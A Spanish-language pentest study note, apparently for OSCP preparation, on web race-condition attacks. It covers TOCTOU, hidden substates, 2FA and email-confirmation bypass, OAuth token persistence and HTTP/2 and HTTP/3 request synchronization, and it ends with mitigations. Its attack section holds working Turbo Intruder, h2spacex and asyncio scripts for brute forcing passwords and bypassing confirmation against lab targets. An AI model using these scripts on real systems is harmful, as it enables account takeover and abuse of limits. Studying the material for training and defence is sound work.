## 📚 Índice

- [[#📌 Definición]]
- [[#🧠 Concepto clave (mental model)]]
- [[#🧩 Tipos comunes de Race Conditions]]
- [[#🔥 Casos reales donde aparecen]]
- [[#🧪 RC Methodology]]
- [[#🧱 Limit-overrun / TOCTOU]]
- [[#🕳️ Hidden substates]]
- [[#⏱️ Time Sensitive Attacks]]
- [[#📚 Hidden substates case studies]]
- [[#🔐 Hidden Database states / Confirmation Bypass]]
- [[#🔑 Bypass 2FA]]
- [[#🪪 OAuth2 eternal persistence]]
- [[#🌐 RC in WebSockets]]
- [[#🔧 Enhancing Race Condition Attacks]]
- [[#🎯 Objetivo de “Enhancing”]]
- [[#🔄 Técnicas para sincronizar requests]]
- [[#🧵 HTTP/2 Single-Packet Attack vs HTTP/1.1 Last-Byte Synchronization]]
- [[#🌐 HTTP/3 Last-Frame Synchronization (QUIC)]]
- [[#🏗️ Adapting to Server Architecture]]
- [[#🧷 Handling Session-Based Locking]]
- [[#🚦 Overcoming Rate or Resource Limits]]
- [[#⚔️ Attack Examples]]
- [[#🧨 Turbo Intruder - HTTP/2 single-packet (1 endpoint)]]
- [[#🧨 Turbo Intruder - HTTP/2 single-packet (Several endpoints)]]
- [[#🧪 Automated python script (H2 single-packet + email verification RC)]]
- [[#🧠 Turbo Intruder: engine and gating notes]]
- [[#🚀 Improving Single Packet Attack]]
- [[#🧨 Raw BF]]
- [[#📌 Intruder (threads + null payloads)]]
- [[#🧨 Turbo Intruder (multi-session gate)]]
- [[#🐍 Python - asyncio]]
- [[#🛡️ Mitigaciones (lado defensor)]]
- [[#🧠 Resumen mental para OSCP / pentest]]
- [[#🧭 Checklist mental rápido]]

---

## 📌 Definición

Una **Race Condition** ocurre cuando **dos o más procesos/hilos** acceden a un **recurso compartido** de forma simultánea y el resultado depende del **orden real de ejecución**, el cual no está correctamente sincronizado.

Si el sistema no controla ese acceso, el atacante puede:

- leer datos ajenos
    
- sobrescribir archivos
    
- ejecutar acciones antes de que se apliquen validaciones
    
- evadir controles lógicos
    
- escalar privilegios
    
- provocar DoS
    
- ejecutar comandos (si hay cadenas inseguras / `exec()` mal usado)
    

---

## 🧠 Concepto clave (mental model)

> “Gana el que llegue primero… o el que llegue más rápido muchas veces.”

Una race condition **no es un payload**, es un **fallo lógico/arquitectónico**.

Patrón clásico:

```text
CHECK → USE
```

Cuando el sistema:

1. verifica algo
    
2. y luego lo usa  
    pero **entre ambos pasos existe una ventana temporal** suficiente para interferir.
    

---

## 🧩 Tipos comunes de Race Conditions

### 1️⃣ TOCTOU (Time Of Check To Time Of Use)

```text
if (file_exists("x")):
    open("x")
```

Entre `check` y `use`, el atacante cambia el estado.

### 2️⃣ File Race Condition

Archivos temporales/logs/uploads/reportes con nombres predecibles:

- `/tmp/output.txt`
    
- `report_<user>.txt`
    
- `logs/session.log`
    

### 3️⃣ Race Condition lógica (web apps)

- doble transferencia
    
- doble compra con descuento
    
- doble reset de contraseña
    
- doble creación de recurso
    
- doble validación
    
- borrado + lectura simultánea
    

### 4️⃣ Race + ejecución insegura (Command Injection / File-to-RCE)

Ejemplo peligroso:

```js
exec(`bash scripts/${user}.sh`)
```

---

## 🔥 Casos reales donde aparecen

### ✔ Subida de archivos

- backend crea temporal
    
- valida tarde
    
- borra después  
    ➡️ leer antes del borrado → leak
    

### ✔ Exportaciones/descargas

Dos usuarios generan el mismo `report.txt` → se cruzan datos.

### ✔ Procesos asíncronos

workers/colas/callbacks/promesas/hilos.

### ✔ Scripts generados dinámicamente

```bash
echo "$INPUT" > script.sh
bash script.sh
rm script.sh
```

---

## 🧪 RC Methodology

Esta sección es el “cómo pensar” una RC de forma sistemática.

---

## 🧱 Limit-overrun / TOCTOU

El tipo más básico: donde la app limita cuántas veces puedes hacer algo, pero ese límite se rompe por concurrencia.

Ejemplos típicos:

- canjear una gift card múltiples veces
    
- puntuar un producto varias veces
    
- retirar/transferir más saldo del disponible
    
- reutilizar una solución CAPTCHA
    
- bypass anti brute-force / rate limit
    
- usar el mismo cupón de descuento varias veces
    

**Idea**: disparas N requests “a la vez” y el control (check) se evalúa con estado viejo antes de “consumir” el recurso.

---

## 🕳️ Hidden substates

Las RC complejas aparecen cuando puedes interactuar con **subestados internos** (ventanas cortas) de una máquina de estados.

### 1) Identificar endpoints candidatos

Busca endpoints que toquen datos críticos:

- perfil de usuario
    
- password reset
    
- confirmación de email
    
- cupones / pagos / saldo
    
- tokens de verificación
    

Enfócate en:

- **Storage**: preferir endpoints que escriben en datos persistentes server-side.
    
- **Action**: operaciones que **modifican** datos existentes (más jugosas que “crear”).
    
- **Keying**: acciones “keyed” por el mismo ID (username, token, userId).
    

### 2) Probing inicial

Lanza ataques de carrera y observa:

- respuestas extrañas
    
- inconsistencias
    
- cambios inesperados en estado
    
- tokens repetidos
    
- bypass de flujos
    

### 3) Demostrar la vuln (minimal repro)

Reduce a **la menor cantidad de requests** necesarias (a veces 2), aunque requiera múltiples intentos por timing.

---

## ⏱️ Time Sensitive Attacks

Cuando tokens/códigos se generan de forma predecible (ej: timestamps), la concurrencia puede revelar el fallo.

### Para explotar:

- sincroniza 2 requests de generación de token (ej reset password)
    
- compara tokens resultantes
    
- si son idénticos → fallo de generación
    

**Ejemplo práctico**:

1. solicita 2 password resets simultáneos
    
2. compara tokens
    
3. si coinciden, hay vuln
    

---

## 📚 Hidden substates case studies

### 💳 Pay & add an Item

Pagas y agregas un item “gratis” por una ventana de subestado.

### ✅ Confirm other emails

Verificas un email mientras lo cambias a otro y observas cuál se valida realmente.

### 🍪 Change email to 2 emails addresses Cookie based

Según research, GitLab fue vulnerable a takeover porque podía mandar el token de verificación de un email al otro (cruce de estado/variables).

---

## 🔐 Hidden Database states / Confirmation Bypass

Si al crear un usuario hay 2 escrituras:

1. username/password
    
2. token de confirmación
    

Durante una ventana, el token puede ser `null`.

Ataque:

- registras usuario
    
- envías muchas confirmaciones con token vacío:
    
    - `token=`
        
    - `token[]=`
        
    - variantes
        

Si la app no valida correctamente, puedes confirmar cuentas sin controlar el email.

---

## 🔑 Bypass 2FA

Pseudocódigo vulnerable:

```python
session['userid'] = user.userid
if user.mfa_enabled:
    session['enforce_mfa'] = True
    # generate and send MFA code
    # redirect to MFA entry
```

Ventana: la sesión existe con `userid` antes de forzar `enforce_mfa`.

---

## 🪪 OAuth2 eternal persistence

Contexto: OAuth permite apps que el usuario autoriza.

### Race Condition en `authorization_code`

Tras autorizar, recibes `authorization_code` y abusas RC para generar múltiples pares AT/RT desde el mismo code.

Luego:

- el usuario revoca permisos
    
- se elimina 1 par AT/RT
    
- otros pares siguen válidos → persistencia
    

### Race Condition en Refresh Token (RT)

Con un RT válido intentas generar múltiples AT/RT y aunque el usuario cancele permisos, algunos RT pueden seguir válidos por race.

---

## 🌐 RC in WebSockets

Hay PoCs (ej: `WS_RaceCondition_PoC` en Java) para enviar mensajes WS en paralelo.

Con Burp:

- WebSocket Turbo Intruder + engine `THREADED`
    
- spawneas múltiples conexiones WS y disparas payloads paralelos
    
- suele ser más fiable que “batching” en una sola conexión cuando la race depende de handlers server-side
    

---

# 🔧 Enhancing Race Condition Attacks

---

## 🎯 Objetivo de “Enhancing”

**El mayor obstáculo** al aprovechar una race condition es asegurarte de que **múltiples requests se procesen al mismo tiempo**, con diferencia ideal **< 1ms**.

Esto es timing + sincronización (no “payload mágico”).

---

## 🔄 Técnicas para sincronizar requests

---

## 🧵 HTTP/2 Single-Packet Attack vs HTTP/1.1 Last-Byte Synchronization

### HTTP/2: Single-Packet Attack

HTTP/2 permite enviar 2+ requests sobre **una sola conexión TCP**, reduciendo el impacto del jitter de red.

Pero:

- por variaciones server-side, 2 requests pueden no bastar
    
- a veces necesitas decenas/cientos de streams para consistencia
    

### HTTP/1.1: “Last-Byte Sync”

Permite pre-enviar la mayor parte de **20–30 requests**, reteniendo un fragmento mínimo (último byte), y luego enviarlo junto para llegada simultánea.

#### Preparación “Last-Byte Sync”

1. Enviar headers + body **menos el último byte**, sin cerrar stream.
    
2. Pausar ~100ms tras el envío inicial.
    
3. Deshabilitar `TCP_NODELAY` para usar **Nagle** y batch final.
    
4. Enviar ping para calentar.
    
5. Enviar los frames retenidos juntos.
    

Resultado esperado:

- llegan en **un solo paquete** (verificable en Wireshark).
    

Notas:

- no aplica a **archivos estáticos** (no suelen estar en RC reales).
    

---

## 🌐 HTTP/3 Last-Frame Synchronization (QUIC)

### Concepto

HTTP/3 va sobre QUIC (UDP):

- no hay coalescencia TCP
    
- no hay Nagle
    
- last-byte sync clásico no funciona con clientes “normales”
    

Solución:

- coalescer **múltiples stream-final DATA frames (FIN)** en **el mismo datagrama UDP**, para que el servidor procese todo en el mismo tick.
    

### Cómo hacerlo

Usar librería con control de frames QUIC.  
Ej: **H3SpaceX** manipula `quic-go` para implementar last-frame sync en:

- requests con body
    
- requests GET-style sin body
    

#### Requests con body

- enviar `HEADERS + DATA` sin el último byte para N streams
    
- flushear el byte final de cada stream juntos
    

#### GET-style (sin body)

- crear DATA frames falsos (o body mínimo con `Content-Length`)
    
- cerrar todos los streams en un datagrama
    

### Límites prácticos

- concurrencia limitada por `max_streams` (análogo a `SETTINGS_MAX_CONCURRENT_STREAMS`)
    
- si es bajo: abrir múltiples conexiones H3 y repartir la race
    
- MTU limita cuántos FIN puedes coalescer
    
- librería puede dividir en varios datagramas, pero **uno solo es más fiable**
    

---

## 🏗️ Adapting to Server Architecture

Entender la arquitectura del objetivo es crítico:

- front-end puede rutear distinto (workers/shards)
    
- afecta timing
    

**Connection warming**:

- requests inocuas antes del ataque
    
- normaliza timing y reduce variabilidad
    

---

## 🧷 Handling Session-Based Locking

PHP y otros frameworks serializan requests por sesión (ocultan races):

- handler de sesión puede bloquear por session-id
    
- requests “en paralelo” se vuelven secuenciales
    

Solución:

- usar **session tokens distintos** por request para evitar el lock.
    

---

## 🚦 Overcoming Rate or Resource Limits

Si warming no funciona:

- provocar delays internos por rate/resource limits
    
- flood de requests dummy para inducir retraso
    
- facilita single-packet al crear “ventana” favorable
    

---

# ⚔️ Attack Examples

---

## 🧨 Turbo Intruder - HTTP/2 single-packet (1 endpoint)

Pasos:

1. Burp → Extensions → Turbo Intruder → **Send to Turbo Intruder**
    
2. Modifica el parámetro a bruteforce usando `%s`, ej:
    

```txt
csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s
```

3. Selecciona `examples/race-single-packet-attack.py`.
    

### Variante: wordlist desde el portapapeles

```python
passwords = wordlists.clipboard
for password in passwords:
    engine.queue(target.req, password, gate='race1')
```

⚠️ Warning:  
Si el target no soporta HTTP/2 (solo HTTP/1.1), usa:

- `Engine.THREADED` o `Engine.BURP`  
    en vez de `Engine.BURP2`.
    

---

## 🧨 Turbo Intruder - HTTP/2 single-packet (Several endpoints)

Caso: 1 endpoint prepara estado y múltiples endpoints lo explotan.

Ejemplo de modificación del script:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # Hardcode the second request for the RC
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

    # For each attempt (20 in total) send 50 confirmation requests.
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'aUser' + currentAttempt

        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)

        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)

        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)
```

También se puede en Repeater con:

- **Send group in parallel**
    

Tips:

- Limit-overrun: añade la misma request 50 veces
    
- Warming: añade al inicio requests a endpoints no estáticos
    
- Delays entre subestados: mete requests “relleno” entre pasos
    
- Multi-endpoint: primero request que abre estado oculto, luego 50 que lo explotan
    

---

## 🧪 Automated python script (H2 single-packet + email verification RC)

Objetivo:

- cambiar email
    
- spamear verificación
    
- hasta que el token del email nuevo llegue donde quieres (antes llegaba al viejo por RC)
    

Cuando se detecta “objetivo” en los emails, se detiene.

> Nota: sustituyo **host/cookie reales** por placeholders.

```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge (adaptado con placeholders)
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie = "session=<JWT_OR_SESSION_COOKIE_HERE>"

# change these headers
headersObjetivo = """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """ + cookie + """
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40example.htb&username=estes&fullName=test&antiCSRFToken=<CSRF_HERE>'

headersVerification = """Content-Length: 1
Cookie: """ + cookie + """
"""

CSRF = "<CSRF_HERE>"

host = "<TARGET_HOST>"
puerto = <TARGET_PORT>

url = "https://" + host + ":" + str(puerto) + "/email/"

response = requests.get(url, verify=False)

while "objetivo" not in response.text:

    urlDeleteMails = "https://" + host + ":" + str(puerto) + "/email/deleteall/"
    responseDeleteMails = requests.get(urlDeleteMails, verify=False)

    Headers = {"Cookie": cookie, "content-type": "application/x-www-form-urlencoded"}
    data = "email=test%40email.htb&username=estes&fullName=test&antiCSRFToken=" + CSRF
    urlReset = "https://" + host + ":" + str(puerto) + "/challenge/api/profile"
    responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

    print(responseReset.status_code)

    h2_conn = H2OnTlsConnection(
        hostname=host,
        port_number=puerto
    )

    h2_conn.setup_connection()

    try_num = 100
    stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

    all_headers_frames = []  # headers + data sin el último byte
    all_data_frames = []     # data con el último byte (flush final)

    for i in range(0, try_num):
        last_data_frame_with_last_byte = b''
        if i == try_num/2:
            header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
                method='POST',
                headers_string=headersObjetivo,
                scheme='https',
                stream_id=stream_ids_list[i],
                authority=host,
                body=bodyObjetivo,
                path='/challenge/api/profile'
            )
        else:
            header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
                method='GET',
                headers_string=headersVerification,
                scheme='https',
                stream_id=stream_ids_list[i],
                authority=host,
                body=".",
                path='/challenge/api/sendVerification'
            )

        all_headers_frames.append(header_frames_without_last_byte)
        all_data_frames.append(last_data_frame_with_last_byte)

    # concatenar headers bytes
    temp_headers_bytes = b''
    for h in all_headers_frames:
        temp_headers_bytes += bytes(h)

    # concatenar data frames (últimos bytes)
    temp_data_bytes = b''
    for d in all_data_frames:
        temp_data_bytes += bytes(d)

    h2_conn.send_bytes(temp_headers_bytes)

    # esperar un poco
    sleep(0.1)

    # ping para calentar conexión
    h2_conn.send_ping_frame()

    # flush final: enviar últimos bytes
    h2_conn.send_bytes(temp_data_bytes)

    resp = h2_conn.read_response_from_socket(_timeout=3)
    frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
    frame_parser.add_frames(resp)
    frame_parser.show_response_of_sent_requests()

    print('---')

    sleep(3)
    h2_conn.close_connection()

    response = requests.get(url, verify=False)
```

---

## 🧠 Turbo Intruder: engine and gating notes

### Engine selection

- HTTP/2 target: `Engine.BURP2` (single-packet)
    
- HTTP/1.1 target: `Engine.THREADED` o `Engine.BURP` (last-byte sync)
    

### gate / openGate

- `gate='race1'` retiene el “tail” de cada request
    
- `openGate('race1')` flushea todos los tails juntos → llegada casi simultánea
    

### Diagnostics

- timestamps negativos: servidor respondió antes de que el request se terminara de enviar → overlap real (esperable en races reales)
    

### Connection warming

- ping o requests harmless antes para estabilizar timing
    
- opcional: desactivar `TCP_NODELAY` para batching
    

---

## 🚀 Improving Single Packet Attack

Research original: límite ~1500 bytes.

Mejora: extender a **65.535 bytes** (window TCP) usando **fragmentación a nivel IP**:

- dividir 1 paquete en múltiples IP packets
    
- enviarlos fuera de orden
    
- evitar reensamblaje hasta que llegue el último fragmento
    
- permite muchísimas requests sincronizadas
    

Resultado reportado:

- ~10.000 requests en ~166ms
    

Limitaciones software:

- servidores con `SETTINGS_MAX_CONCURRENT_STREAMS` estricto:
    
    - Apache: 100
        
    - Nginx: 128
        
    - Go: 250
        
    - NodeJS / nghttp2: ilimitado
        

HTTP/3 análogo:

- `max_streams` de QUIC
    
- si es bajo: repartir en múltiples conexiones QUIC
    

Repo con ejemplos:

```text
https://github.com/Ry0taK/first-sequence-sync/tree/main
```

---

## 🧨 Raw BF

Antes de estas técnicas finas, se hacía “a lo bruto”: mandar lo más rápido posible para provocar RC.

### Repeater

Usa los ejemplos de “send group in parallel” y repite requests.

---

## 📌 Intruder (threads + null payloads)

- enviar request a Intruder
    
- en Options: threads = **30**
    
- payloads: **Null payloads**
    
- generar 30
    

Idea: máximo paralelismo sin cambiar payload.

---

## 🧨 Turbo Intruder (multi-session gate)

Ejemplo: disparar la race con múltiples sesiones (para evitar locks por sesión):

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
    for i in range(len(a)):
        engine.queue(target.req, a[i], gate='race1')

    # open TCP connections and send partial requests
    engine.start(timeout=10)
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

---

## 🐍 Python - asyncio

Paralelismo “claro” en Python para enviar 20 requests concurrentes:

```python
import asyncio
import httpx

async def use_code(client):
    resp = await client.post(
        'http://victim.com',
        cookies={"session": "asdasdasd"},
        data={"code": "123123123"}
    )
    return resp.text

async def main():
    async with httpx.AsyncClient() as client:
        tasks = []
        for _ in range(20):  # 20 times
            tasks.append(asyncio.ensure_future(use_code(client)))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in results:
            print(r)

        # Async2sync sleep
        await asyncio.sleep(0.5)

    print(results)

asyncio.run(main())
```

---

## 🛡️ Mitigaciones (lado defensor)

- locks (mutex/semaphore)
    
- operaciones atómicas
    
- colas
    
- transacciones DB
    
- nombres aleatorios/UUID
    
- evitar nombres fijos en temporales
    
- `fs.open`/write con flags seguros (`wx`)
    
- `atomic rename`
    
- evitar `exec()` con input
    
- validaciones antes del “use”
    
- control de concurrencia por recurso (no solo por sesión)
    

---

## 🧠 Resumen mental para OSCP / pentest

- RC = timing + estado
    
- el “payload” es la sincronización
    
- si no puedes sincronizar, no explotas
    
- reduce jitter (HTTP/2/3) y calienta conexión
    
- evita locks por sesión (sessions distintas)
    
- repite hasta reproducir y luego minimiza
    

---

## 🧭 Checklist mental rápido

- ¿hay límites de uso (cupón, token, saldo, rate limit)?
    
- ¿hay dos pasos CHECK→USE?
    
- ¿hay estado oculto (substate) entre pasos?
    
- ¿hay writes DB en 2 fases?
    
- ¿hay token que puede ser null o repetido?
    
- ¿hay session-locking?
    
- ¿puedo sincronizar requests (HTTP/2/H3/last-byte)?
    

Si respondes “sí” a 2–3: tienes superficie fuerte.

---

